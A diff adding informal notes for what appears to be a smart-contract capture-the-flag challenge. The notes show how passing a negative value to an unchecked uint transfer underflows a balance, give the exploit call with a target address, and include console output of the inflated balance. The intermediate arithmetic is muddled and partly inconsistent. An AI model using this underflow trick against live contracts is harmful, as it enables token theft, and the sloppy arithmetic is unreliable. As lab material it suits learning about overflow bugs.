@@ -1,0 +1,51 @@
+simple  overflow issue
+
+the input of transfer is a uint
+if you pass -100 it will be confert implecitly like
+max uint256 - 99
+so 
+HEX 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9b
+
+
+max uint256 =
+>>> 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+115792089237316195423570985008687907853269984665640564039457584007913129639935L
+
+max uint 256 - 100 =
+>>> 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff-100
+115792089237316195423570985008687907853269984665640564039457584007913129639835L
+
+
+so we pass the require then we are updating the balance
+
+ balances[msg.sender] -= _value;
+
+balance is 20 so 
+20  - 115792089237316195423570985008687907853269984665640564039457584007913129639835
+
+-115792089237316195423570985008687907853269984665640564039457584007913129639815
+
+we get +100
+
+the balance of the other address get super high also so the best way it s to own the other adress we seen the value
+
+
+to complete the challenge: 
+
+
+contract.transfert(0x71910f79eB7A871C10B7324EAaec00a984bA553C, -10000000)
+
+then it's done
+
+contract.balanceOf(player)
+Promise {<pending>}
+__proto__: Promise
+[[PromiseStatus]]: "resolved"
+[[PromiseValue]]: t
+c: Array(1)
+0: 10000020
+length: 1
+__proto__: Array(0)
+e: 7
+s: 1
+__proto__: Object
